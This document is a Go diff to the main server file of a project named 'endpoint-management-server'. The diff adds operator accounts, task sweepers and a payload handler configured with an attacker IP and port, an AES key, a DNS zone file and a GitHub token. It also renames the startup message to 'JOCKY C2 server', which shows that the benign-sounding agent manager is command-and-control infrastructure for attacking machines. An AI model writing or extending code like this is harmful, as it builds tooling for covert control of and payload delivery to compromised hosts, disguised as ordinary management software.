@@ -11,7 +11,9 @@ import (
 
 	"github.com/joho/godotenv"
 	"github.com/redis/go-redis/v9"
+	"golang.org/x/crypto/bcrypt"
 
+	"endpoint-management-server/internal/config"
 	"endpoint-management-server/internal/db"
 	"endpoint-management-server/internal/handlers"
 	"endpoint-management-server/internal/queue"
@@ -22,43 +24,81 @@ import (
 func main() {
 	_ = godotenv.Load()
 
-	pgDSN := requireEnv("POSTGRES_DSN")
-	redisAddr := requireEnv("REDIS_ADDR")
-	redisPassword := os.Getenv("REDIS_PASSWORD")
-	port := getEnvDefault("PORT", "8080")
+	cfg, err := config.Load()
+	if err != nil {
+		log.Fatalf("config error: %v", err)
+	}
 
-	conn, err := db.Connect(pgDSN)
+	conn, err := db.Connect(cfg.PostgresDSN)
 	if err != nil {
 		log.Fatalf("postgres connection failed: %v", err)
 	}
 	defer conn.Close()
 
 	redisClient := redis.NewClient(&redis.Options{
-		Addr:         redisAddr,
-		Password:     redisPassword,
+		Addr:         cfg.RedisAddr,
+		Password:     cfg.RedisPassword,
 		DB:           0,
 		PoolSize:     100,
 		MinIdleConns: 10,
 	})
 	defer redisClient.Close()
 
-	if err := redisClient.Ping(context.Background()).Err(); err != nil {
+	ctx := context.Background()
+	if err := redisClient.Ping(ctx).Err(); err != nil {
 		log.Fatalf("redis connection failed: %v", err)
 	}
 
-	agentRepo := repository.NewAgentRepository(conn)
-	taskRepo := repository.NewTaskRepository(conn)
+	// Determine whether the Redis instance supports LMPOP (>= 7.0).
+	useLMPOP, err := queue.CheckRedisVersion(ctx, redisClient)
+	if err != nil {
+		log.Printf("warning: could not check Redis version, disabling LMPOP: %v", err)
+	}
+	if useLMPOP {
+		log.Println("Redis >= 7.0 detected — using LMPOP for atomic batch queue drain")
+	} else {
+		log.Println("Redis < 7.0 — using serial LPOP fallback")
+	}
+
+	// Build repositories.
+	agentRepo     := repository.NewAgentRepository(conn)
+	taskRepo      := repository.NewTaskRepository(conn)
 	telemetryRepo := repository.NewTelemetryRepository(conn)
-	taskQueue := queue.NewTaskQueue(redisClient)
+	auditRepo     := repository.NewAuditRepository(conn)
+	operatorRepo  := repository.NewOperatorRepository(conn)
+	dashRepo      := repository.NewDashboardRepository(conn)
 
-	agentHandler := handlers.NewAgentHandler(agentRepo, taskRepo, telemetryRepo, taskQueue)
+	// Seed an admin operator on first boot if the operators table is empty.
+	if err := seedAdminOperator(ctx, operatorRepo, cfg.AdminPassword); err != nil {
+		log.Printf("admin seed warning: %v", err)
+	}
 
+	taskQueue := queue.NewTaskQueue(redisClient, useLMPOP)
+
+	// Build handlers.
+	agentHandler := handlers.NewAgentHandler(
+		agentRepo, taskRepo, telemetryRepo, auditRepo, taskQueue, cfg.MaxRetries,
+	)
+	operatorHandler := handlers.NewOperatorHandler(operatorRepo, auditRepo, cfg.OperatorSecret)
+	payloadHandler  := handlers.NewPayloadHandler(
+		redisClient, auditRepo,
+		cfg.AESKey, cfg.EC2PublicIP, cfg.ZoneFilePath,
+		cfg.WebhookSecret, cfg.AttackerIP, cfg.AttackerPort,
+		cfg.GitHubToken,
+	)
+	dashboardHandler := handlers.NewDashboardHandler(dashRepo, auditRepo, redisClient)
+
+	// Background goroutines.
 	go staleAgentSweeper(agentRepo)
+	go taskExpirySweeper(ctx, taskRepo, auditRepo)
 
-	r := router.New(agentHandler, agentRepo, redisClient)
+	r := router.New(
+		agentHandler, operatorHandler, payloadHandler, dashboardHandler,
+		agentRepo, redisClient, cfg.OperatorSecret,
+	)
 
 	srv := &http.Server{
-		Addr:              ":" + port,
+		Addr:              ":" + cfg.Port,
 		Handler:           r,
 		ReadHeaderTimeout: 5 * time.Second,
 		ReadTimeout:       15 * time.Second,
@@ -67,7 +107,7 @@ func main() {
 	}
 
 	go func() {
-		log.Printf("endpoint management server listening on :%s", port)
+		log.Printf("JOCKY C2 server listening on :%s", cfg.Port)
 		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
 			log.Fatalf("server error: %v", err)
 		}
@@ -78,13 +118,35 @@ func main() {
 	<-quit
 
 	log.Println("shutting down gracefully...")
-	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	shutCtx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
 	defer cancel()
-	if err := srv.Shutdown(ctx); err != nil {
+	if err := srv.Shutdown(shutCtx); err != nil {
 		log.Fatalf("forced shutdown: %v", err)
 	}
 }
 
+// seedAdminOperator creates the initial "admin" operator if none exist yet.
+func seedAdminOperator(ctx context.Context, repo *repository.OperatorRepository, rawPassword string) error {
+	n, err := repo.Count(ctx)
+	if err != nil {
+		return err
+	}
+	if n > 0 {
+		return nil
+	}
+	hash, err := bcrypt.GenerateFromPassword([]byte(rawPassword), 12)
+	if err != nil {
+		return err
+	}
+	_, err = repo.Create(ctx, "admin", string(hash))
+	if err != nil {
+		return err
+	}
+	log.Println("seeded initial admin operator")
+	return nil
+}
+
+// staleAgentSweeper marks agents offline when they haven't polled recently.
 func staleAgentSweeper(agentRepo *repository.AgentRepository) {
 	ticker := time.NewTicker(30 * time.Second)
 	defer ticker.Stop()
@@ -99,17 +161,23 @@ func staleAgentSweeper(agentRepo *repository.AgentRepository) {
 	}
 }
 
-func requireEnv(key string) string {
-	v := os.Getenv(key)
-	if v == "" {
-		log.Fatalf("missing required env var: %s", key)
+// taskExpirySweeper marks expired tasks and writes an audit log entry for each.
+func taskExpirySweeper(ctx context.Context, taskRepo *repository.TaskRepository, auditRepo *repository.AuditRepository) {
+	ticker := time.NewTicker(60 * time.Second)
+	defer ticker.Stop()
+	for range ticker.C {
+		sweepCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+		expiredIDs, err := taskRepo.ExpireStale(sweepCtx)
+		if err != nil {
+			log.Printf("task expiry sweeper error: %v", err)
+		}
+		for _, id := range expiredIDs {
+			tid := id
+			_ = auditRepo.Write(sweepCtx, "task_expired", "task", &tid, "system", nil)
+		}
+		if len(expiredIDs) > 0 {
+			log.Printf("expired %d stale tasks", len(expiredIDs))
+		}
+		cancel()
 	}
-	return v
-}
-
-func getEnvDefault(key, fallback string) string {
-	if v := os.Getenv(key); v != "" {
-		return v
-	}
-	return fallback
 }
